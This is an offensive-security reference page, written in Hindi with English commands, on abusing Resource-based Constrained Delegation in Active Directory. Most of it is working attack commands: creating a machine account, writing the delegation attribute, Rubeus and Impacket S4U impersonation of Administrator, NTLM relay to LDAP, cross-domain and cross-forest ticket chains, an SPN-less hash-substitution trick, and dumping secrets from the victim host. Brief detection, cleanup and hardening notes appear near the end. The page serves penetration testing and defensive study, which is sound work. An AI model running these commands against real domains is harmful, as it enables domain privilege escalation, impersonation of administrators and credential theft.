# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation की मूल बातें

यह basic [Constrained Delegation](constrained-delegation.md) के समान है, लेकिन **इसके बजाय** किसी **object** को **किसी machine के विरुद्ध किसी भी user का impersonate करने** की permissions देने के, Resource-based Constrain Delegation **उस object में यह सेट करता है कि उसके विरुद्ध किसी भी user का impersonate कौन कर सकता है**।

इस मामले में, constrained object में _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नामक एक attribute होगा, जिसमें उस user का नाम होगा जो उसके विरुद्ध किसी भी अन्य user का impersonate कर सकता है।

इस Constrained Delegation और अन्य delegations के बीच एक और महत्वपूर्ण अंतर यह है कि किसी **machine account पर write permissions** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) रखने वाला कोई भी user **_msDS-AllowedToActOnBehalfOfOtherIdentity_** सेट कर सकता है। (Delegation के अन्य forms में आपको domain admin privileges की आवश्यकता होती थी।)

### New Concepts

Constrained Delegation में बताया गया था कि user के _userAccountControl_ value के अंदर **`TrustedToAuthForDelegation`** flag का होना **S4U2Self** perform करने के लिए आवश्यक है। लेकिन यह पूरी तरह सही नहीं है।\
वास्तविकता यह है कि इस value के बिना भी, यदि आप एक **service** हैं (आपके पास SPN है), तो आप किसी भी user के विरुद्ध **S4U2Self** perform कर सकते हैं। लेकिन यदि आपके पास **`TrustedToAuthForDelegation`** है, तो लौटाया गया TGS **Forwardable** होगा, और यदि आपके पास यह flag **नहीं** है, तो लौटाया गया TGS **Forwardable** नहीं होगा।

हालांकि, यदि **S4U2Proxy** में उपयोग किया गया **TGS** **Forwardable नहीं** है, तो basic Constrain Delegation का abuse करने का प्रयास **काम नहीं करेगा**। लेकिन यदि आप Resource-Based constrain delegation exploit करने का प्रयास कर रहे हैं, तो यह **काम करेगा**।

### Attack structure

> यदि आपके पास किसी **Computer** account पर **write equivalent privileges** हैं, तो आप उस machine में **privileged access** प्राप्त कर सकते हैं।

मान लें कि attacker के पास victim computer पर पहले से **write equivalent privileges** हैं।

1. Attacker ऐसे account को **compromise** करता है जिसके पास **SPN** है या एक **SPN** बनाता है ("Service A")। ध्यान दें कि कोई भी _Admin User_ बिना किसी अन्य special privilege के अधिकतम 10 Computer objects (**_MachineAccountQuota_**) **create** कर सकता है और उन पर **SPN** सेट कर सकता है। इसलिए attacker केवल एक Computer object create करके उस पर SPN सेट कर सकता है।
2. Attacker victim computer (ServiceB) पर अपने **WRITE privilege** का **abuse** करके **resource-based constrained delegation** configure करता है, ताकि ServiceA उस victim computer (ServiceB) के विरुद्ध किसी भी user का impersonate कर सके।
3. Attacker Service A से Service B तक ऐसे user के लिए **full S4U attack** (S4U2Self और S4U2Proxy) perform करने के लिए Rubeus का उपयोग करता है, जिसके पास Service B पर **privileged access** है।
1. S4U2Self (SPN compromised/created account से): **Administrator से मेरे लिए TGS** मांगें (Not Forwardable)।
2. S4U2Proxy: पिछले step के **not Forwardable TGS** का उपयोग करके **Administrator** से **victim host** के लिए **TGS** मांगें।
3. भले ही आप not Forwardable TGS का उपयोग कर रहे हों, क्योंकि आप Resource-based constrained delegation exploit कर रहे हैं, यह काम करेगा।
4. Attacker **pass-the-ticket** कर सकता है और **victim ServiceB** तक **access** प्राप्त करने के लिए user का **impersonate** कर सकता है।

Domain के _**MachineAccountQuota**_ को check करने के लिए आप इसका उपयोग कर सकते हैं:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attack

### Computer Object बनाना

आप **[powermad](https://github.com/Kevin-Robertson/Powermad)** का उपयोग करके domain के अंदर एक computer object बना सकते हैं:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuring Resource-based Constrained Delegation

**Using activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview का उपयोग करना**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक complete S4U attack करना (Windows/Rubeus)

सबसे पहले, हमने `123456` password के साथ नया Computer object बनाया, इसलिए हमें उस password का hash चाहिए:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस account के RC4 और AES hashes print करेगा।\
अब, attack किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` param का उपयोग करके केवल एक बार पूछकर अधिक services के लिए अधिक tickets generate कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ध्यान दें कि users के पास "**Cannot be delegated**" नामक एक attribute होता है। यदि किसी user के लिए यह attribute True है, तो आप उसका impersonate नहीं कर पाएंगे। यह property bloodhound के अंदर देखी जा सकती है।

### Linux tooling: Impacket के साथ end-to-end RBCD (2024+)

यदि आप Linux से काम कर रहे हैं, तो official Impacket tools का उपयोग करके पूरी RBCD chain perform कर सकते हैं:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
नोट्स
- यदि LDAP signing/LDAPS लागू है, तो `impacket-rbcd -use-ldaps ...` का उपयोग करें।
- AES keys को प्राथमिकता दें; कई आधुनिक domains RC4 को प्रतिबंधित करते हैं। Impacket और Rubeus दोनों AES-only flows को support करते हैं।
- Impacket कुछ tools के लिए `sname` ("AnySPN") को rewrite कर सकता है, लेकिन जब भी संभव हो, सही SPN प्राप्त करें (जैसे, CIFS/LDAP/HTTP/HOST/MSSQLSvc)।

## Cross-domain और cross-forest RBCD

यदि आपके नियंत्रण में मौजूद **delegating principal**, **resource computer** से **अलग domain** (या **अलग forest**) में रहता है, तो abuse अभी भी **RBCD** ही है, लेकिन ticket flow अब सामान्य single-domain `S4U2Self -> S4U2Proxy` नहीं रहता।

### Cross-domain RBCD: foreign principal को SID द्वारा configure करना

जब आप **अलग domain** से `msDS-AllowedToActOnBehalfOfOtherIdentity` सेट करते हैं, तो foreign machine/user target domain LDAP में **नाम से resolvable** नहीं हो सकता। ऐसी स्थिति में, delegation entry को उसके sAMAccountName/UPN के बजाय foreign principal के **SID** का उपयोग करके configure करें।

यह विशेष रूप से `ntlmrelayx.py` के साथ NTLM को LDAP पर relay करते समय प्रासंगिक है:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` `ntlmrelayx.py` को `--escalate-user` को SID के रूप में मानने के लिए कहता है, जो तब आवश्यक होता है जब delegating account target domain का न हो।
- भले ही tool `User not found in LDAP` प्रिंट करे, delegation write फिर भी सफल हो सकता है, क्योंकि security descriptor foreign SID को सीधे store करता है।

### Cross-domain RBCD: cross-realm S4U sequence

जब foreign principal `msDS-AllowedToActOnBehalfOfOtherIdentity` में मौजूद हो, तो काम करने वाला cross-domain flow यह है:

1. Delegating principal के अपने domain से उसका **TGT** प्राप्त करें।
2. `krbtgt/<target-domain>` के लिए एक **referral TGT** का अनुरोध करें।
3. Target-domain DC पर impersonated user के लिए **cross-realm S4U2Self referral** का अनुरोध करें।
4. Delegator domain में उस user के लिए वास्तविक **S4U2Self** ticket का अनुरोध करें।
5. Delegator domain में **S4U2Proxy** करें और target domain के लिए एक referral ticket प्राप्त करें।
6. `cifs/host.target`, `host/host.target`, आदि के लिए service ticket प्राप्त करने हेतु target-domain DC पर अंतिम **S4U2Proxy** करें।

इसी कारण stock Linux tooling अक्सर cross-domain RBCD में विफल हो जाती है:
- request का **realm**, `TGS-REQ` में उपयोग किए गए TGT के realm से अलग होना आवश्यक हो सकता है
- chain में **independent S4U2Proxy steps** आवश्यक होते हैं, केवल `S4U2Self` या उसके तुरंत बाद एक single `S4U2Proxy पर्याप्त नहीं होता

### Cross-domain RBCD from Linux

Synacktiv ने एक Impacket `getST.py` implementation प्रकाशित किया है, जो दो KDCs को स्पष्ट रूप से handle करके Linux से cross-realm sequence को reproduce करता है:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
व्यावहारिक रूप से, नए arguments हैं:
- `-dc-ip`: **delegating** domain का DC
- `-targetdomain`: **resource computer** का domain
- `-targetdc`: **resource** domain का DC

### Cross-forest RBCD limitations

Cross-forest RBCD की एक महत्वपूर्ण limitation है: **impersonated user का संबंध उसी forest से होना चाहिए, जिसमें delegating principal है**। दूसरे शब्दों में, यदि आपका controlled machine account `valhalla.local` में है और target resource `asgard.local` में है, तो आमतौर पर आप RBCD के माध्यम से उस resource पर मनमाने `asgard.local` users का **impersonate** नहीं कर सकते।

फिर भी यह इन स्थितियों में exploitable है:
- **delegating forest** का user दूसरे forest के resource host पर **local admin** (या अन्य रूप से privileged) हो
- कोई trust आवश्यक authentication path की अनुमति देता हो और target computer के security descriptor में foreign SID स्वीकार किया जाता हो

### Cross-forest RBCD protocol quirks

Cross-forest RBCD केवल "cross-domain plus a trust" नहीं है। Observed flow में दो quirks शामिल हैं, जिन्हें common tooling ऐतिहासिक रूप से miss करता है:

1. एक अतिरिक्त **S4U2Proxy** request, जो **`PA-PAC-OPTIONS=branch-aware`** सेट करती है
2. एक final service ticket, जो अन्य etypes request किए जाने पर भी **RC4** का उपयोग करके return किया जा सकता है

Practical flow यह है:

1. Forest A में delegating principal के लिए TGT प्राप्त करें।
2. Forest A में impersonated user के लिए **S4U2Self** request करें।
3. Forest A में **S4U2Proxy** request करके forest B के लिए referral TGT प्राप्त करें।
4. Forest A में दूसरा **S4U2Proxy** भेजें, जिसमें S4U2Self ticket को additional ticket के रूप में शामिल न करें, लेकिन `branch-aware` enabled हो, ताकि forest B के लिए एक और referral TGT प्राप्त किया जा सके।
5. वैकल्पिक रूप से, forest B में delegating principal के लिए एक normal service ticket request करें (final abuse के लिए यह ticket आवश्यक नहीं है)।
6. Steps 3 और 4 से प्राप्त referral tickets का उपयोग करके forest B में target SPN के लिए impersonated forest-A user का final **S4U2Proxy** ticket request करें।

### Cross-forest RBCD from Linux

Synacktiv Impacket branch इसी logic के लिए `-forest` switch जोड़ता है:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forests** में, **S4U2Self** और **S4U2Proxy** दोनों एक referral के बाद रुकने के बजाय **recursive** हो सकते हैं:

- **Recursive S4U2Self**: पहला `S4U2Self` **impersonated user's domain** को भेजा जाता है, intermediate parent/child hops को `krbtgt/<REALM>` के लिए सामान्य `TGS-REQ` referrals के साथ पार किया जाता है, और **final `S4U2Self`** को **delegating principal's own domain** में भेजा जाता है।
- इसका अर्थ है कि किसी machine account के लिए केवल एक **TGT** रखना ही पर्याप्त हो सकता है, जिससे उसी forest के किसी अन्य domain के **admin** का impersonation किया जा सके और `cifs/host`, `host/host`, `wsman/host`, आदि के लिए अनुरोध किया जा सके।
- **Recursive S4U2Proxy** भी इसी तरह trust chain का अनुसरण करता है: intermediate hops पिछले ticket को TGT के रूप में दोबारा उपयोग करते हैं और अगले `krbtgt/<REALM>` referral का अनुरोध करते हैं; केवल अंतिम hop final service ticket लौटाता है।

एक practical same-forest उदाहरण है:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

यदि **delegating principal एक ऐसा user है जिसके पास SPN नहीं है**, तो अंतिम recursive `S4U2Self` **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** के साथ fail हो जाता है। इसका workaround है कि **केवल अंतिम hop को `S4U2Self+U2U` के रूप में retry** किया जाए।

Abuse chain का संक्षिप्त रूप:

1. **NT hash** के साथ authenticate करें, ताकि KDC को **RC4-HMAC (etype 23)** की ओर push किया जा सके।
2. पहले **`-self -u2u`** request करें और इस ticket को बाद के proxy step से अलग रखें।
3. `describeTicket.py` के साथ **TGT session key** extract करें।
4. `changepasswd.py -newhashes <session_key>` का उपयोग करके user's **NT hash** को उस **session key** से replace करें।
5. एक अलग **`-proxy`** request के दौरान `S4U2Self+U2U` ticket को **`-additional-ticket`** के रूप में reuse करें।
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- जब **first trusted hop पहले से ही किसी अन्य forest में हो**, तो native Windows behavior से मेल खाने के लिए **branch-aware** algorithm (`getST.py ... -forest`) को प्राथमिकता दें। यदि foreign forest chain में **बाद में** पहुंचा जाता है, तो non-branch-aware recursive flow अभी भी काम कर सकता है।
- हाल के **Windows Server 2022/2025** DCs पर, RC4 को force करने पर **`KDC_ERR_ETYPE_NOSUPP`** विफलता आ सकती है, क्योंकि RC4 को deprecate किया जा रहा है; इससे **SPN-less RBCD** असंभव हो सकता है, भले ही classic SPN-backed RBCD AES के साथ काम करता हो।
- User का hash/password बदलने से पहले **`S4U2Self+U2U`** चलाएं: `SamrChangePasswordUser` account की Kerberos AES keys को recompute **नहीं** करता, इसलिए पहले password बदलने पर बाद के ticket requests विफल हो सकते हैं।
- Impersonated account अभी भी **delegable** होना चाहिए: **Protected Users** और **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** वाले accounts इस chain को block करते हैं।

## Detection / hardening notes

- Domains/forests के बीच RBCD paths अभी भी आमतौर पर **ACL abuse** या **relay-to-LDAP** के जरिए बनाए जाते हैं। Common setup paths को रोकने के लिए DCs पर **LDAP signing** और **LDAP channel binding** लागू करें।
- Audit करें कि computer objects पर `msDS-AllowedToActOnBehalfOfOtherIdentity` लिखने की अनुमति किसे है और stored SIDs को resolve करें, जिसमें **foreign security principals** भी शामिल हैं।
- Trust-heavy environments में **Selective Authentication**, **SID filtering**, और यह review करें कि foreign forest के users के पास resource hosts पर **local admin** rights हैं या नहीं।

### Accessing

अंतिम command line **complete S4U attack करेगी और Administrator से victim host में TGS को memory में inject करेगी**।\
इस example में Administrator से **CIFS** service के लिए TGS request किया गया था, इसलिए आप **C$** access कर पाएंगे:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न service tickets का दुरुपयोग

[**उपलब्ध service tickets के बारे में यहाँ जानें**](silver-ticket.md#available-services)।

## Enumeration, auditing और cleanup

### RBCD configured वाले computers की Enumeration

PowerShell (SIDs को resolve करने के लिए SD को decode करना):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (एक command से read या flush करें):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (attribute clear करें):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: इसका अर्थ है कि kerberos को DES या RC4 का उपयोग न करने के लिए configured किया गया है और आप केवल RC4 hash दे रहे हैं। Rubeus को कम से कम AES256 hash दें (या उसे rc4, aes128 और aes256 hashes दें)। Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- सामान्य user के लिए `-self` के दौरान **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal के पास संभवतः **कोई SPN नहीं है**। नियमित **`S4U2Self`** के बजाय **`S4U2Self+U2U`** के रूप में **अंतिम hop** को फिर से चलाएँ।
- **SPN-less RBCD** के दौरान **`KDC_ERR_ETYPE_NOSUPP`**: recent DCs, **`S4U2Self+U2U`** + session-key-substitution trick के लिए आवश्यक forced **RC4-HMAC** path को reject कर सकते हैं। इसके बजाय AES के साथ classic **SPN-backed** RBCD path आज़माएँ।
- **`KRB_AP_ERR_SKEW`**: इसका अर्थ है कि current computer का समय DC के समय से अलग है और kerberos ठीक से काम नहीं कर रहा है।
- **`preauth_failed`**: इसका अर्थ है कि दिया गया username + hashes login करने के लिए काम नहीं कर रहे हैं। हो सकता है कि hashes generate करते समय आप username के अंदर `"$"` लगाना भूल गए हों (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: इसका अर्थ हो सकता है:
- जिस user का आप impersonate करने का प्रयास कर रहे हैं, वह desired service access नहीं कर सकता (क्योंकि आप उसे impersonate नहीं कर सकते या उसके पास पर्याप्त privileges नहीं हैं)
- मांगी गई service मौजूद नहीं है (यदि आप winrm के लिए ticket मांग रहे हैं, लेकिन winrm running नहीं है)
- बनाए गए fakecomputer ने vulnerable server पर अपने privileges खो दिए हैं और आपको उन्हें वापस देना होगा।
- आप classic KCD का abuse कर रहे हैं; याद रखें कि RBCD non-forwardable S4U2Self tickets के साथ काम करता है, जबकि KCD को forwardable की आवश्यकता होती है।

## Notes, relays and alternatives

- यदि LDAP filtered है, तो आप AD Web Services (ADWS) के माध्यम से भी RBCD SD लिख सकते हैं। देखें:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains अक्सर एक step में local SYSTEM प्राप्त करने के लिए RBCD पर समाप्त होती हैं। Practical end-to-end examples देखें:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- यदि LDAP signing/channel binding **disabled** हैं और आप machine account बना सकते हैं, तो **KrbRelayUp** जैसे tools coerced Kerberos auth को LDAP पर relay कर सकते हैं, target computer object पर आपके machine account के लिए `msDS-AllowedToActOnBehalfOfOtherIdentity` set कर सकते हैं, और off-host से S4U के माध्यम से तुरंत **Administrator** को impersonate कर सकते हैं।

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
